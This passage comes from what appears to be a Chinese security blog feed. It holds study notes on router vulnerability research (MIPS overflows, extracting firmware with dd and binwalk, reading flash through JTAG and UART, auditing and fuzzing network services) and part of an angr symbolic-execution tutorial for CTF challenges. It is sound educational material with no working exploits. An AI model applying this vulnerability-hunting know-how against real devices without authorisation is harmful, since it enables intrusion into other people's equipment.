title="栈布局"></a>栈布局</h4><p>mips32架构有两种函数类型：</p><ul><li>叶子函数：不会再调用其他函数</li><li>非叶子函数</li></ul><p>函数调用过程（A调用B）：</p><ol><li><p>复制当前 <code>$PC</code> 寄存器的值到 <code>$RA</code> 寄存器，然后跳转到函数 B 执行代码</p></li><li><p>程序跳转到函数 B 后</p><ul><li><p>如果函数 B 是<strong>非叶子函数</strong>，则函数 B 里首先会把函数 A 的返回地址入栈，函数返回时，函数 B 先从栈中取出被保存在栈上的返回地址，然后将返回地址存入寄存器 <code>$RA</code>，再使用 “jr $RA” 指令返回函数 A</p></li><li><p>如果函数 B 是<strong>叶子函数</strong>，则在函数返回时直接使用 “jr $RA” 指令返回函数 A</p></li></ul></li></ol><p>参数传递：</p><p>mips通过a0-a3传递前4个参数，其余通过栈传递，栈帧结构如下，栈空间不需要保留前四个参数，但是caller函数预留前四个参数的栈内存空间，callee函数内分配栈空间后将寄存器值复制到caller预留位置中</p><h4 id="缓冲区溢出漏洞利用"><a href="#缓冲区溢出漏洞利用" class="headerlink" title="缓冲区溢出漏洞利用"></a>缓冲区溢出漏洞利用</h4><p>非叶子函数与正常溢出利用相同，叶子函数一般无法直接利用，除非存在可以溢出大量数据的情况，就可以通过一路覆盖到父函数中的返回地址去劫持程序流</p><h2 id="软件层分析"><a href="#软件层分析" class="headerlink" title="软件层分析"></a>软件层分析</h2><h3 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h3><p>路由器固件是包含操作系统的内核以及文件系统的软件，包含了所有可执行程序和配置文件信息。</p><h4 id="获取途径"><a href="#获取途径" class="headerlink" title="获取途径"></a>获取途径</h4><ul><li>路由器厂商网站下载</li><li>登陆路由web管理界面获取相关信息，到对应网站下载固件，通过后台选择新固件升级</li><li>硬件接入，从路由器flash提取固件</li><li>云市场：淘宝，咸鱼</li></ul><h3 id="文件系统-1"><a href="#文件系统-1" class="headerlink" title="文件系统"></a>文件系统</h3><h4 id="基础理论"><a href="#基础理论" class="headerlink" title="基础理论"></a>基础理论</h4><p>文件系统：路由器的文件系统是用于<strong>存储操作系统、配置文件、日志文件</strong>等数据的系统，不同路由器文件系统格式不同，<strong>根文件系统会被打包</strong>成路由器使用的文件系统格式再<strong>组装到固件中</strong></p><p>压缩格式：由于路由器设备大小有限所以存在各种针对文件系统的<strong>压缩格式</strong>，常见的有<code>Squashfs</code>，一个有极高压缩率的只读格式的文件系统</p><p>Squashfs：路由器<strong>根文件系统</strong>通常按照<code>Squashfs</code>文件系统常用压缩格式（GZIP, LZMA, LZO, XZ）中的一种进行打包写成<code>Squashfs</code>文件系统，再<strong>结合固件头部、压缩后的内核等部分形成完整固件</strong></p><p>系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，<strong>仅将对应部分的压缩文件解压缩</strong></p><h4 id="手工提取文件系统"><a href="#手工提取文件系统" class="headerlink" title="手工提取文件系统"></a>手工提取文件系统</h4><p>难点：</p><ol><li>不同的操作系统使用的文件系统不同</li><li>路由的文件系统的压缩算法有可能存在差异</li><li>有些路由甚至使用非标准的甚至是加密的压缩算法来打包文件系统</li></ol><p>常见解包手法：通过手工分析的方式从大量字节码数据中正确地识别出文件系统、固件解密、利用工具自动化分析</p><ul><li><p>信息收集：利用 file 查看文件类型，file 命令通过定义的 magic 签名文件来识别各种格式，在头部添加内容就会无法识别</p></li><li><p>进一步检索：</p><ul><li><p><code>strings xxx.bin | grep xxx</code>检索 magic 签名头，表明该文件可能包含某个文件系统</p><blockquote><p>cramfs特征：0x28cd3d45</p><p>squashfs特征：sqsh, hsqs, qshs, shsq, hsqt, tqsh, sqlz</p></blockquote><p>端序未知时需要进行两次搜索</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ strings firmware.bin <span class="token operator">|</span> <span class="token function">grep</span> <span class="token variable"><span class="token variable">`</span>python <span class="token parameter variable">-c</span> <span class="token string">'print "\x28\xcd\x3d\x45"'</span><span class="token variable">`</span></span>$ strings firmware.bin <span class="token operator">|</span> <span class="token function">grep</span> <span class="token variable"><span class="token variable">`</span>python <span class="token parameter variable">-c</span> <span class="token string">'print "\x45\x3d\xcd\x28"'</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>hexdump -C xxx.bin | grep xx</code>确认某个签名之后检索 magic 签名偏移</p></li><li><p><code>dd | file -</code>确定签名具体偏移时可以用这个指令确认是否匹配某种文件格式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//magic偏移0x100,复制从0x100开始的0x100字节到out,确认文件属性和大小$ <span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>firmware.bin <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">100</span> <span class="token assign-left variable">skip</span><span class="token operator">=</span><span class="token number">256</span> <span class="token assign-left variable">of</span><span class="token operator">=</span>out$ <span class="token function">file</span> out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>dd 可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出</p><p>if&#x3D;文件名：输入文件名，指定源文件</p><p>of&#x3D;文件名：输出文件名，指定目的文件</p><p>ibs&#x3D;bytes：一次读入bytes个字节<br>obs&#x3D;bytes：一次输出bytes个字节<br>bs&#x3D;bytes：同时设置读入&#x2F;输出的块大小为bytes个字节</p><p>cbs&#x3D;bytes：一次转换bytes个字节，即指定转换缓冲区大小</p><p>skip&#x3D;blocks：从输入文件开头跳过blocks个块后再开始复制</p><p>seek&#x3D;blocks：从输出文件开头跳过blocks个块后再开始复制</p><p>count&#x3D;blocks：仅拷贝blocks个块，大小等于ibs指定的字节数</p></blockquote></li><li><p>得到文件大小和偏移之后提取文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//从0x100开始提取1024字节到out$ <span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>firmware.bin <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">1024</span> <span class="token assign-left variable">skip</span><span class="token operator">=</span><span class="token number">256</span> <span class="token assign-left variable">of</span><span class="token operator">=</span>out.squashfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>提取文件系统</p><p>提取出文件系统之后还需要<strong>还原文件系统中的根文件系统</strong>，利用 file -m 加载自定义的magic签名文件（这些文件通常包含用于匹配文件类型的模式和规则，包括文件头部的特定字节序列、文件大小、文件内容的特定模式等）以输出更详细的信息，了解压缩方式等，找对应工具解压</p></li></ul><h4 id="自动提取文件系统"><a href="#自动提取文件系统" class="headerlink" title="自动提取文件系统"></a>自动提取文件系统</h4><p>在线网站：<a href="https://zhiwanyuzhou.com/multiple_analyse/firmware/%E6%B2%A1%E6%9C%89%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C%E8%AF%B4%E6%98%8E%E5%9B%BA%E4%BB%B6%E6%98%AF%E5%8A%A0%E5%AF%86%E7%9A%84">https://zhiwanyuzhou.com/multiple_analyse/firmware/没有分析结果说明固件是加密的</a></p><p>Binwalk：</p><ul><li><p>扫描固件中包含的所有可识别的文件类型</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ binwalk x.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>提取文件，解包出来的 squashfs-root 就是文件系统</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//-e 按照预定义的配置文件中的提取方法从固件中提取探测到的文件系统//-M 根据 magic 签名扫描结果进行递归提取$ binwalk <span class="token parameter variable">-Me</span> x.bin --run-as<span class="token operator">=</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>分析可执行程序的指令系统，可以结合 file 和 checksec 确认</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ binwalk <span class="token parameter variable">-A</span> elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>其他用法：<code>--magic</code>指定自定义 magic 签名文件路径或将自定义的签名规则添加到<code>$HOME/.binwalk/magic/binwalk</code>来识别新文件类型，识别成功后可向 Binwalk 配置文件添加这种新文件类型</p></li></ul><h2 id="硬件层分析"><a href="#硬件层分析" class="headerlink" title="硬件层分析"></a>硬件层分析</h2><p>通过路由器硬件提供的接口获取固件，连接计算机和路由器主板，提取路由器数据</p><h3 id="路由器flash"><a href="#路由器flash" class="headerlink" title="路由器flash"></a>路由器flash</h3><p>闪存：路由器常用的一种内存类型，断电后仍能保存数据，存放正在使用的路由器操作系统等数据。</p><p>flash：像硬盘，有多个分区</p><ul><li><p>bootloader</p><p>常见的 bootloader 有 bios、uefi、u-boot 等，其中 u-boot 更多用于嵌入式系统</p><p>bootloader 存储对设备供电后<strong>启动操作系统的引导程序</strong>，<strong>对硬件环境初始化、更新固件、建立内存空间映射表</strong>从而配置适当的系统软硬件环境、调用操作系统内核并加载到内存中运行</p></li><li><p>kernel</p><p>操作系统内核</p></li><li><p>root filesystem</p><p>操作系统的根文件系统，如squashfs，rootfs</p></li><li><p>nvram</p><p>保存路由器配置文件，路由器启动后会从中读取配置文件对路由器进行设置</p></li></ul><h3 id="硬件提取数据思路"><a href="#硬件提取数据思路" class="headerlink" title="硬件提取数据思路"></a>硬件提取数据思路</h3><ul><li>连接主板上的 JTAG 之类调试接口</li><li>从主板上取下 Flash 芯片，通过芯片上的引脚连接编程器，但很容易对路由器造成物理损伤</li><li>利用芯片夹夹住芯片引脚，通过芯片夹接口连接到编程器，这样就不需要将芯片从主板上取下来</li></ul><h3 id="路由器串口"><a href="#路由器串口" class="headerlink" title="路由器串口"></a>路由器串口</h3><p>给开发人员使用，用于访问路由器固件环境、观察boot和调试信息、通过shell与系统进行交互异步串行通信、烧录固件等</p><p>路由器主要串口URAR，包含引脚：VCC（电源电压） GND（接地引脚） TXD（数据发送引脚） RXD（数据接收引脚）</p><h2 id="漏挖思路和方法"><a href="#漏挖思路和方法" class="headerlink" title="漏挖思路和方法"></a>漏挖思路和方法</h2><h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><p>对系统进行仿真，找开放了监听端口的服务，抓包分析，从通信网络层分析</p><ul><li><p>记录常见服务端口</p><p>http 80https 443DNS 53ftp 21ssh 22</p></li><li><p>从网络服务着手</p><p>抓包看本地回环&#x2F;整个局域网下的流量，能看见心跳包等数据报文，观察哪个程序起了主导的交互作用；看启动了什么进程，有哪些针对 <code>0.0.0.0</code> 的端口监听</p></li></ul><p>分析信息路由、路由导向，找分发网络消息的路由和处理逻辑，需要积累，例如 tenda 路由器的 web 启动程序通常在 bin 目录下的 httpd文件</p><p>确定漏挖目标进程，分析通信协议和与程序进行交互的方式，后续进行静态代码审计和模糊测试</p><h3 id="静态代码审计"><a href="#静态代码审计" class="headerlink" title="静态代码审计"></a>静态代码审计</h3><p>找核心逻辑的思路：</p><ol><li><p>多看源码，了解开发思路，熟悉相关框架</p></li><li><p>查找对 <code>socket, bind, listen, accept</code> 这类网络通信函数的调用，可以通过这些函数了解到当前<strong>程序的网络服务相关信息</strong></p><p>查找对 <code>sendmsg, recvmsg, read, write</code> 这类函数的调用，一般能够顺着这些交互点找到<strong>报文处理逻辑</strong></p></li><li><p>使用 python 脚本建立 socket 连接，查看回显，利用这些信息去搜索相应的字符串，查<strong>引用定位</strong>主要逻辑</p></li><li><p>查看程序的字符串，从一些输出报错、记录日志等相关字符串中窥探到函数功能</p><p>如输出信息 <code>option xxx</code> 一般是指命令的选项，类似 -r -a 那种参数，那这一部分代码就可能在执行某种选项功能</p></li></ol><p>分析敏感函数调用、数据处理，观察是否有溢出风险，以及数据处理不当导致的命令注入、逻辑漏洞等</p><p>从数据来源角度进行分析：</p><ul><li>命令行参数：对 argv 的处理</li><li>环境变量：getenv</li><li>文件、数据报文数据读取：read, fscanf, getc, fgetc, fgets, vfscanf</li><li>键盘输入、stdin：read, scanf, getchar, gets</li><li>网络数据：read, recv, recvfrom</li></ul><p>从数据操作角度进行分析：</p><ul><li>命令执行：system, popen, execve, execl, execvp</li><li>字符串拼接、复制：strcat, strcpy, strncpy</li><li>格式化字符串：sprintf, snprintf</li></ul><h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>Fuzzing 的大致流程：确定输入变量 -&gt;生成模糊测试数据 -&gt; 执行模糊测试 -&gt; 监视异常 -&gt; 根据被测试系统状态判断是否存在潜在安全漏洞</p><p>主流的 fuzz 工具有 AFL++、Boofuzz等，选择工具需要考虑 fuzz 工具的区别和使用</p><ol><li>fuzz 目标语言和平台：程序？内核？协议？…</li><li>变异策略 - 原语：了解工具的常用 API 使用方法，熟悉测试脚本编写</li><li>状态管理、性能和效率：fuzz 在某种程度上来说是比较低效的漏挖手段，这种情况下怎么判断 Crash 和有效值，减少误报</li><li>特殊情况：如分析目标在通信时会进行多次交互</li></ol><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>嘿嘿我ve1宝写的OvO</p><p><a href="https://xz.aliyun.com/t/16512">https://xz.aliyun.com/t/16512</a></p><p><a href="https://xz.aliyun.com/t/16511">https://xz.aliyun.com/t/16511</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前置基础&quot;&gt;&lt;a href=&quot;#前置基础&quot; class=&quot;headerlink&quot; title=&quot;前置基础&quot;&gt;&lt;/a&gt;前置基础&lt;/h2&gt;&lt;h3 id=&quot;路由的漏洞利用&quot;&gt;&lt;a href=&quot;#路由的漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;路由的</summary>
      
    
    
    
    <category term="IoT" scheme="https://starrysky1004.github.io/categories/IoT/"/>
    
    
    <category term="IoT" scheme="https://starrysky1004.github.io/tags/IoT/"/>
    
  </entry>
  
  <entry>
    <title>angr学习与angr_CTF题解（持续更新）</title>
    <link href="https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/"/>
    <id>https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/</id>
    <published>2024-12-16T16:18:27.000Z</published>
    <updated>2024-12-16T16:26:47.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="angr基础知识"><a href="#angr基础知识" class="headerlink" title="angr基础知识"></a>angr基础知识</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>angr 是一个支持多处理架构的用于二进制文件分析的工具包，它提供了动态符号执行的能力以及多种静态分析的能力。它可以被使用者扩展，用于自动化逆向工程、漏洞挖掘等多个方面</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li>安装 angr</li></ol>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> pip <span class="token function">install</span> angr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装 angr-utils</li></ol>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$mkdir</span> angr-dev<span class="token variable">$cd</span> angr-dev<span class="token variable">$git</span> clone https://github.com/axt/bingraphvis<span class="token variable">$pip</span> <span class="token function">install</span> <span class="token parameter variable">-e</span> ./bingraphvis<span class="token variable">$git</span> clone https://github.com/axt/angr-utils<span class="token variable">$pip</span> <span class="token function">install</span> <span class="token parameter variable">-e</span> ./angr-utils<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><h4 id="project"><a href="#project" class="headerlink" title="project"></a>project</h4><p>project 类是 angr 的主类，也是angr的开始，通过初始化 project 类加载二进制文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrp <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'file_path'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其他可选参数</p><table><thead><tr><th>名称</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>auto_load_libs</td><td>是否自动加载程序的依赖（少加载无关结果的库可以提升angr效率）</td><td>auto_load_libs　&#x3D; False</td></tr><tr><td>skip_libs</td><td>希望避免加载的库</td><td>skip_libs &#x3D; 库名</td></tr><tr><td>except_missing_libs</td><td>无法解析库时是否抛出异常</td><td>True &#x2F; False</td></tr><tr><td>force_load_libs</td><td>强制加载的库</td><td>force_load_libs &#x3D; 库名</td></tr><tr><td>ld_path</td><td>共享库的优先搜索路径</td><td>ld_path &#x3D; 路径名</td></tr></tbody></table><p>project 类的方法和属性：</p><ul><li><p>p.arch : 文件架构</p></li><li><p>hex(p.entry) ： 程序入口点</p></li><li><p>p.filename ： 加载的文件名</p></li><li><p>p.arch.bits ： 字长（32位 &#x2F; 64位）</p></li><li><p>p.arch.memory_endness ： 大小端</p></li></ul><h4 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h4><p>project只是加载二进制文件，实际是对simstate对象操作</p><p>simstate对象是程序的状态，包含运行时的一切信息，例如寄存器、内存值、文件系统、<strong>符号变量</strong></p><p>创建状态</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>预设状态：</p><p>前两个比较常用，blank_state用于跳过一些极大降低angr效率的指令，初始时rax的数据类型都是bit vector</p><table><thead><tr><th>预设状态方式</th><th>描述</th></tr></thead><tbody><tr><td>entry_state</td><td>初始化状态为程序运行到程序入口点处的状态</td></tr><tr><td>blank_state(addr&#x3D;)</td><td><strong>大多数数据都没有初始化</strong>，状态中下一条指令为addr处的指令</td></tr><tr><td>full_init_state</td><td>共享库和预定义内容已经加载完毕，例如刚加载完共享库</td></tr><tr><td>call_state</td><td>准备调用函数的状态</td></tr></tbody></table><p>factory 类的方法：</p><ul><li>state.regs.rax</li></ul><h4 id="simgr"><a href="#simgr" class="headerlink" title="simgr"></a>simgr</h4><p>simulation manager（SM）模拟管理器，要分析程序就要让它到达下一个状态</p><p>使用 simgr 创建 sm， 需要传入 state 或 state的列表</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sm 有许多被成为 stash 的列表，保存了处于某种状态的 state</p><p>stash 是一个列表，可以用 python 方式遍历，angr 也提供了获取方式：stash 名字前加上 one_ 得到第一个状态，加上 mp_ 得到一个 mulpyplexed 版本的stash，例如<code>simgr.one_active</code></p><table><thead><tr><th>stash</th><th>描述</th></tr></thead><tbody><tr><td>active （默认值）</td><td>保存接下来可以执行并且将要执行的状态</td></tr><tr><td>deadended</td><td>由于某些原因不能继续执行的状态，例如没有合法指令，或者有非法指针</td></tr><tr><td>pruned</td><td>与 solve 的策略有关，当发现一个不可解的节点后，其后面所有的节点都优化掉放在 pruned 里</td></tr><tr><td>unconstrained</td><td>如果创建 SM 时启用了 save_unconstrained，则被认定为不受约束的 state 会放在这，不受约束的 state 是指由用户数据或符号控制的指令指针（例如eip）</td></tr><tr><td>unsat</td><td>如果创建SM时启用了save_unsat，则被认为不可满足的 state 会放在这里</td></tr></tbody></table><p>simgr 类的方法：</p><ul><li><p>使用 move() 转移state，将 fulter_func 筛选出来的 state 从 from_stash 转移到 to_stash</p><p><code>state.posix.dumps(0)</code>：到达当前状态对应的程序输入</p><p><code>state.posix.dumps(1)</code>：到达当前状态对应的程序输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#从 'deadended' 状态堆栈中，筛选出那些标准输出中包含字符串 '100' 的状态，并将这些状态移动到 'more_then_50' 状态堆栈中，匿名函数的参数是 s</span>simgr<span class="token punctuation">.</span>move<span class="token punctuation">(</span>from_stash<span class="token operator">=</span><span class="token string">'deadended'</span><span class="token punctuation">,</span> to_stash<span class="token operator">=</span><span class="token string">'more_then_50'</span><span class="token punctuation">,</span> filter_func<span class="token operator">=</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token string">'100'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>使用 step() 方法使处于 active 的 state 执行一个基本块，不会改变 state 本身</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">simgr<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="explorer"><a href="#explorer" class="headerlink" title="explorer"></a>explorer</h4><p>用于探索模拟状态直到找到特定条件满足的状态的方法，有 <strong>find</strong>（目标指令的地址或地址列表） 和 <strong>avoid</strong>（避免的指令地址或地址列表） 两种参数，找到符合的 find 状态会保存在 <strong>simger.found</strong> 列表中，可遍历元素获取状态</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'path_to_binary'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span>find_address <span class="token operator">=</span> <span class="token number">0x4017c0</span>avoid_address <span class="token operator">=</span> <span class="token number">0x401230</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>find_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>avoid_address<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">#打印出符号条件的状态的输入    </span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><ul><li><code>solver.eval(expression)</code> 将会解出一个可行解</li><li><code>solver.eval_one(expression)</code>将会给出一个表达式的可行解，若有多个可行解，则抛出异常。</li><li><code>solver.eval_upto(expression, n)</code>将会给出最多n个可行解，如果不足n个就给出所有的可行解。</li><li><code>solver.eval_exact(expression, n)</code>将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。</li><li><code>solver.min(expression)</code>将会给出最小可行解</li><li><code>solver.max(expression)</code>将会给出最大可行解</li></ul><h4 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h4><p>符号执行就是<u>给程序传递一个符号而不是具体的值</u></p><p>遇到分支时 angr 会保存所有分支以及分支后的所有分支，在分支时保存进入该分支时的判断条件，通常判断条件是对符号的约束</p><p>当 angr 运行到目标状态可以调用求解器对一路上收集到的约束求解，最终得到某个符号能够到达当前状态的值</p><p><img src="/angr%E5%AD%A6%E4%B9%A0%E4%B8%8Eangr-CTF%E9%A2%98%E8%A7%A3%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/3031561-20221129171743462-301356444.png" alt="img"></p><p><img src="/angr%E5%AD%A6%E4%B9%A0%E4%B8%8Eangr-CTF%E9%A2%98%E8%A7%A3%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/3031561-20221128133848616-99279409.png" alt="img"></p><p>angr 的 state 属性都是状态插件，包括 memory 、regs 、 men 、registers 、solver等，用于控制仿真程序看到的环境，包括如何从环境中引入符号数据</p><h5 id="寄存器符号化"><a href="#寄存器符号化" class="headerlink" title="寄存器符号化"></a>寄存器符号化</h5><p>跳过输入定位到输入之后，直接改变寄存器，将 state 传入 simgr，<code>solution_state.solver.eval(arg1)</code>获取得到的值，可控制多个寄存器</p><p>位向量：BVV(value, size)BVS(name, size)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'file_path'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start<span class="token punctuation">)</span><span class="token comment">#创建位向量</span>passwd <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'passwd'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> passwdsimgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="栈中的值符号化"><a href="#栈中的值符号化" class="headerlink" title="栈中的值符号化"></a>栈中的值符号化</h5><p>通过计算构造，例如 arg1 -&gt; <u>ebp - 0xc</u>; arg2 -&gt; <u>ebp - 0x10</u></p><p>则构造esp &#x3D; ebp， esp - 0x8， 两个参数入栈（stack_push）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_state_regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esparg1 <span class="token operator">=</span> charipy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> charipy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> <span class="token number">8</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="内存符号化"><a href="#内存符号化" class="headerlink" title="内存符号化"></a>内存符号化</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>passwd0_address<span class="token punctuation">,</span> passwd0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以字节类型输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="动态内存符号化"><a href="#动态内存符号化" class="headerlink" title="动态内存符号化"></a>动态内存符号化</h5><p>由于 angr 并没有真正 运行 二进制文件而只是在模拟运行状态，因此它实际上不需要将内存分配到堆中，实际上可以伪造任何地址，所以将伪造的地址存放到 bss 段的地址中模拟题目的情况即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>endness 